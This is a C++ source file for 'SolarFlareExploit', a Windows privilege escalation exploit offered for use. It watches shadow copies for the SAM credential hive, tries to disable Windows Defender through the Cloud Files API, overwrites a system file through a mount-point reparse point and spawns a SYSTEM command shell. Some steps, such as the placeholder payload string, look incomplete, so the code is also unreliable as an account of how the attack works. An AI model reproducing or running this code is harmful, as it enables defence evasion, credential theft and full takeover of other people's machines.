#include "SolarFlare.h"
#include <iostream>
#include <fstream>
#include <memory>
#include <algorithm>

#pragma comment(lib, "rpcrt4.lib")

SolarFlareExploit::SolarFlareExploit() 
    : m_ntdll(nullptr), m_globalEvent(nullptr), m_pipeHandle(INVALID_HANDLE_VALUE) {
    ZeroMemory(&m_config, sizeof(m_config));
    m_ntdll = GetModuleHandleW(L"ntdll.dll");
}

SolarFlareExploit::~SolarFlareExploit() {
    if (m_globalEvent) CloseHandle(m_globalEvent);
    if (m_pipeHandle != INVALID_HANDLE_VALUE) CloseHandle(m_pipeHandle);
}

bool SolarFlareExploit::InitializeNtFunctions() {
    if (!m_ntdll) return false;
    
    NtOpenDirectoryObject = (decltype(NtOpenDirectoryObject))GetProcAddress(m_ntdll, "NtOpenDirectoryObject");
    NtQueryDirectoryObject = (decltype(NtQueryDirectoryObject))GetProcAddress(m_ntdll, "NtQueryDirectoryObject");
    NtSetInformationFile = (decltype(NtSetInformationFile))GetProcAddress(m_ntdll, "NtSetInformationFile");
    NtCreateFile = (decltype(NtCreateFile))GetProcAddress(m_ntdll, "NtCreateFile");
    
    return NtOpenDirectoryObject && NtQueryDirectoryObject && 
           NtSetInformationFile && NtCreateFile;
}

std::unique_ptr<ShadowVolumeNode> SolarFlareExploit::GetCurrentShadowCopies() {
    UNICODE_STRING devicePath;
    RtlInitUnicodeString(&devicePath, L"\\Device");
    
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &devicePath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    
    HANDLE hObjDir = nullptr;
    NTSTATUS status = NtOpenDirectoryObject(&hObjDir, 0x0001, &objAttr);
    if (status != STATUS_SUCCESS) return nullptr;
    
    std::unique_ptr<ShadowVolumeNode> firstNode = nullptr;
    ShadowVolumeNode* currentNode = nullptr;
    ULONG scanCtx = 0;
    ULONG reqSize = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
    
    auto buffer = std::make_unique<BYTE[]>(reqSize);
    auto objInfo = reinterpret_cast<POBJECT_DIRECTORY_INFORMATION>(buffer.get());
    
    do {
        status = NtQueryDirectoryObject(hObjDir, objInfo, reqSize, FALSE, FALSE, &scanCtx, &reqSize);
        if (status == STATUS_MORE_ENTRIES) {
            reqSize += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
            buffer = std::make_unique<BYTE[]>(reqSize);
            objInfo = reinterpret_cast<POBJECT_DIRECTORY_INFORMATION>(buffer.get());
            ZeroMemory(objInfo, reqSize);
            continue;
        }
        if (status != STATUS_SUCCESS) break;
        
        for (ULONG i = 0; i < ULONG_MAX; i++) {
            if (objInfo[i].Name.Buffer == nullptr) break;
            
            if (_wcsicmp(L"Device", objInfo[i].TypeName.Buffer) == 0) {
                std::wstring name(objInfo[i].Name.Buffer, objInfo[i].Name.Length / sizeof(WCHAR));
                if (name.find(L"HarddiskVolumeShadowCopy") == 0) {
                    auto node = std::make_unique<ShadowVolumeNode>();
                    node->name = name;
                    
                    if (!firstNode) {
                        firstNode = std::move(node);
                        currentNode = firstNode.get();
                    } else {
                        currentNode->next = std::move(node);
                        currentNode = currentNode->next.get();
                    }
                }
            }
        }
    } while (status == STATUS_MORE_ENTRIES);
    
    NtClose(hObjDir);
    return firstNode;
}

bool SolarFlareExploit::FindNewShadowCopy(const std::wstring& targetPath, std::wstring& outPath) {
    auto initialShadows = GetCurrentShadowCopies();
    
    for (int attempt = 0; attempt < 30; attempt++) {
        auto currentShadows = GetCurrentShadowCopies();
        
        // Find new shadow copy
        auto current = currentShadows.get();
        while (current) {
            bool found = false;
            auto initial = initialShadows.get();
            while (initial) {
                if (initial->name == current->name) {
                    found = true;
                    break;
                }
                initial = initial->next.get();
            }
            
            if (!found) {
                outPath = L"\\Device\\" + current->name + targetPath;
                return true;
            }
            current = current->next.get();
        }
        Sleep(1000);
    }
    return false;
}

bool SolarFlareExploit::FreezeDefender(const std::wstring& syncRoot) {
    CF_SYNC_REGISTRATION cfReg = { 0 };
    cfReg.StructSize = sizeof(CF_SYNC_REGISTRATION);
    cfReg.ProviderName = m_config.providerName.c_str();
    cfReg.ProviderVersion = L"1.0";
    
    CF_SYNC_POLICIES syncPolicy = { 0 };
    syncPolicy.StructSize = sizeof(CF_SYNC_POLICIES);
    syncPolicy.HardLink = CF_HARDLINK_POLICY_ALLOWED;
    syncPolicy.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
    syncPolicy.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
    syncPolicy.InSync = CF_INSYNC_POLICY_NONE;
    
    HRESULT hr = CfRegisterSyncRoot(syncRoot.c_str(), &cfReg, &syncPolicy, 
                                     CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
    if (FAILED(hr)) return false;
    
    CF_CALLBACK_REGISTRATION callbackReg[2] = { { CF_CALLBACK_TYPE_NONE, nullptr } };
    CF_CONNECTION_KEY connKey;
    
    hr = CfConnectSyncRoot(syncRoot.c_str(), callbackReg, nullptr,
                           CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO | CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH,
                           &connKey);
    if (FAILED(hr)) {
        CfUnregisterSyncRoot(syncRoot.c_str());
        return false;
    }
    
    CfDisconnectSyncRoot(connKey);
    CfUnregisterSyncRoot(syncRoot.c_str());
    return true;
}

bool SolarFlareExploit::TriggerCloudRewrite(const std::wstring& workDir, const std::wstring& filename) {
    std::wstring fullPath = workDir + L"\\" + filename;
    
    // Create placeholder file to trigger cloud API
    CF_SYNC_REGISTRATION cfReg = { 0 };
    cfReg.StructSize = sizeof(CF_SYNC_REGISTRATION);
    cfReg.ProviderName = L"SolarFlareTrigger";
    cfReg.ProviderVersion = L"1.0";
    
    CF_SYNC_POLICIES syncPolicy = { 0 };
    syncPolicy.StructSize = sizeof(CF_SYNC_POLICIES);
    syncPolicy.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
    
    CfRegisterSyncRoot(workDir.c_str(), &cfReg, &syncPolicy, CF_REGISTER_FLAG_NONE);
    
    FILE_BASIC_INFO fileBasicInfo = { 0 };
    fileBasicInfo.FileAttributes = FILE_ATTRIBUTE_NORMAL;
    CF_FS_METADATA fsMetadata = { fileBasicInfo, { 0x1000 } };
    
    CF_PLACEHOLDER_CREATE_INFO placeholder = { 0 };
    placeholder.RelativeFileName = filename.c_str();
    placeholder.FsMetadata = fsMetadata;
    
    GUID guid;
    CoCreateGuid(&guid);
    WCHAR guidStr[100];
    StringFromGUID2(guid, guidStr, 100);
    placeholder.FileIdentity = guidStr;
    placeholder.FileIdentityLength = wcslen(guidStr) * sizeof(WCHAR);
    placeholder.Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE | CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
    
    CfCreatePlaceholders(workDir.c_str(), &placeholder, 1, CF_CREATE_FLAG_STOP_ON_ERROR, nullptr);
    
    CfUnregisterSyncRoot(workDir.c_str());
    return true;
}

bool SolarFlareExploit::OverwriteSystemFile(const std::wstring& sourcePath, const std::wstring& targetPath) {
    // Use the reparse point technique from RedSun
    HANDLE hDir = CreateFileW(sourcePath.c_str(), GENERIC_WRITE | DELETE | SYNCHRONIZE,
                              FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                              NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hDir == INVALID_HANDLE_VALUE) return false;
    
    // Create reparse point to target system directory
    REPARSE_DATA_BUFFER* rdb = (REPARSE_DATA_BUFFER*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024);
    if (!rdb) {
        CloseHandle(hDir);
        return false;
    }
    
    rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    rdb->ReparseDataLength = static_cast<USHORT>((targetPath.length() * 2) + 12);
    
    memcpy(rdb->MountPointReparseBuffer.PathBuffer, targetPath.c_str(), targetPath.length() * 2 + 2);
    rdb->MountPointReparseBuffer.SubstituteNameLength = static_cast<USHORT>(targetPath.length() * 2);
    rdb->MountPointReparseBuffer.PrintNameLength = 0;
    
    DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, rdb, 
                    REPARSE_DATA_BUFFER_HEADER_LENGTH + rdb->ReparseDataLength,
                    NULL, 0, NULL, NULL);
    
    HeapFree(GetProcessHeap(), 0, rdb);
    CloseHandle(hDir);
    
    // Attempt to write to system file via the reparse point
    std::wstring reparseTarget = sourcePath + L"\\" + targetPath.substr(targetPath.find_last_of(L'\\') + 1);
    
    HANDLE hFile = CreateFileW(reparseTarget.c_str(), GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    
    // Write payload
    char payload[] = "SYSTEM_PRIVILEGE_ACQUIRED";
    DWORD written;
    WriteFile(hFile, payload, sizeof(payload), &written, NULL);
    CloseHandle(hFile);
    
    return true;
}

void SolarFlareExploit::SpawnSystemShell(DWORD sessionId) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) return;
    
    HANDLE hNewToken;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &hNewToken)) {
        CloseHandle(hToken);
        return;
    }
    CloseHandle(hToken);
    
    SetTokenInformation(hNewToken, TokenSessionId, &sessionId, sizeof(DWORD));
    
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    
    CreateProcessAsUserW(hNewToken, L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL,
                         FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    
    CloseHandle(hNewToken);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

bool SolarFlareExploit::IsRunningAsSystem() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return false;
    
    BYTE tokenUserBuf[sizeof(TOKEN_USER) + SECURITY_MAX_SID_SIZE];
    DWORD retSize;
    if (!GetTokenInformation(hToken, TokenUser, tokenUserBuf, sizeof(tokenUserBuf), &retSize)) {
        CloseHandle(hToken);
        return false;
    }
    
    TOKEN_USER* tokenUser = reinterpret_cast<TOKEN_USER*>(tokenUserBuf);
    BOOL isSystem = IsWellKnownSid(tokenUser->User.Sid, WinLocalSystemSid);
    CloseHandle(hToken);
    
    if (isSystem && m_config.enablePostExploit) {
        DWORD sessionId;
        ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
        SpawnSystemShell(sessionId);
    }
    
    return isSystem;
}

bool SolarFlareExploit::Initialize() {
    if (!InitializeNtFunctions()) {
        std::cerr << "Failed to initialize NT functions" << std::endl;
        return false;
    }
    
    m_globalEvent = CreateEventW(nullptr, FALSE, FALSE, nullptr);
    if (!m_globalEvent) return false;
    
    m_pipeHandle = CreateNamedPipeW(L"\\\\.\\pipe\\SOLARFLARE",
                                    PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
                                    PIPE_TYPE_BYTE, 1, 0, 0, 0, nullptr);
    
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    m_workDir = tempPath;
    m_workDir += L"SolarFlare-";
    
    std::wstring guid;
    if (!CreateGuidString(guid)) return false;
    m_workDir += guid;
    
    if (!CreateDirectoryW(m_workDir.c_str(), nullptr)) {
        if (GetLastError() != ERROR_ALREADY_EXISTS) return false;
    }
    
    return true;
}

bool SolarFlareExploit::Run() {
    std::cout << "[*] SolarFlare Exploit Starting..." << std::endl;
    
    // Step 1: Detect VSS and wait for new shadow copy
    std::wcout << L"[*] Monitoring for new Volume Shadow Copy..." << std::endl;
    std::wstring vssPath;
    if (!FindNewShadowCopy(L"\\Windows\\System32\\config\\SAM", vssPath)) {
        std::cerr << "[-] Failed to detect new VSS" << std::endl;
        return false;
    }
    std::wcout << L"[+] Found new VSS at: " << vssPath << std::endl;
    
    // Step 2: Freeze Defender using Cloud API
    std::wcout << L"[*] Freezing Windows Defender..." << std::endl;
    if (!FreezeDefender(m_workDir)) {
        std::cerr << "[-] Failed to freeze Defender" << std::endl;
    }
    
    // Step 3: Trigger cloud rewrite vulnerability
    std::wcout << L"[*] Triggering cloud tag rewrite..." << std::endl;
    if (!TriggerCloudRewrite(m_workDir, L"trigger.dat")) {
        std::cerr << "[-] Cloud rewrite trigger failed" << std::endl;
    }
    
    // Step 4: Overwrite system file
    std::wcout << L"[*] Overwriting " << m_config.targetFile << std::endl;
    if (!OverwriteSystemFile(m_workDir, m_config.targetFile)) {
        std::cerr << "[-] File overwrite failed" << std::endl;
        return false;
    }
    
    // Step 5: Launch the overwritten binary
    std::wcout << L"[+] Exploit complete! Launching privileged binary..." << std::endl;
    
    // Step 6: Post-exploitation if configured
    if (m_config.enablePostExploit) {
        Sleep(2000);
        if (!IsRunningAsSystem()) {
            std::cout << "[*] Attempting privilege escalation..." << std::endl;
            // Trigger the overwritten service
            CoInitializeEx(nullptr, COINIT_MULTITHREADED);
            GUID serviceGuid = { 0x50d185b9, 0xfff3, 0x4656, 
                                 {0x92, 0xc7, 0xe4, 0x01, 0x8d, 0xa4, 0x36, 0x1d} };
            void* pInterface;
            CoCreateInstance(serviceGuid, nullptr, CLSCTX_LOCAL_SERVER, serviceGuid, &pInterface);
            CoUninitialize();
        }
    }
    
    // Cleanup
    RemoveDirectoryW(m_workDir.c_str());
    if (m_pipeHandle != INVALID_HANDLE_VALUE) CloseHandle(m_pipeHandle);
    if (m_globalEvent) CloseHandle(m_globalEvent);
    
    return true;
}

void SolarFlareExploit::SetConfig(const ExploitConfig& config) {
    m_config = config;
}

// Helper function implementations
std::wstring GetTempPath() {
    WCHAR path[MAX_PATH];
    GetTempPathW(MAX_PATH, path);
    return std::wstring(path);
}

bool CreateGuidString(std::wstring& outGuid) {
    GUID guid;
    if (CoCreateGuid(&guid) != S_OK) return false;
    WCHAR guidStr[100];
    if (StringFromGUID2(guid, guidStr, 100) == 0) return false;
    outGuid = guidStr;
    return true;
}

void ReverseString(char* str) {
    int len = (int)strlen(str);
    for (int i = 0; i < len / 2; i++) {
        char t = str[i];
        str[i] = str[len - 1 - i];
        str[len - 1 - i] = t;
    }
}

// Main entry point
int wmain(int argc, WCHAR* argv[]) {
    // Check if running as SYSTEM
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        BYTE tokenUserBuf[sizeof(TOKEN_USER) + SECURITY_MAX_SID_SIZE];
        DWORD retSize;
        if (GetTokenInformation(hToken, TokenUser, tokenUserBuf, sizeof(tokenUserBuf), &retSize)) {
            TOKEN_USER* tokenUser = reinterpret_cast<TOKEN_USER*>(tokenUserBuf);
            if (IsWellKnownSid(tokenUser->User.Sid, WinLocalSystemSid)) {
                // Already SYSTEM - spawn shell
                DWORD sessionId;
                ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
                
                HANDLE hNewToken;
                DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &hNewToken);
                SetTokenInformation(hNewToken, TokenSessionId, &sessionId, sizeof(DWORD));
                
                STARTUPINFOW si = { sizeof(si) };
                PROCESS_INFORMATION pi;
                CreateProcessAsUserW(hNewToken, L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL,
                                     FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
                CloseHandle(hNewToken);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                CloseHandle(hToken);
                return 0;
            }
        }
        CloseHandle(hToken);
    }
    
    SolarFlareExploit exploit;
    ExploitConfig config;
    
    // Parse command line
    for (int i = 1; i < argc; i++) {
        if (wcscmp(argv[i], L"--no-post") == 0) {
            config.enablePostExploit = false;
        } else if (wcscmp(argv[i], L"--target") == 0 && i + 1 < argc) {
            config.targetFile = argv[++i];
        }
    }
    
    exploit.SetConfig(config);
    
    if (!exploit.Initialize()) {
        std::cerr << "Failed to initialize exploit" << std::endl;
        return 1;
    }
    
    if (!exploit.Run()) {
        std::cerr << "Exploit failed" << std::endl;
        return 1;
    }
    
    return 0;
}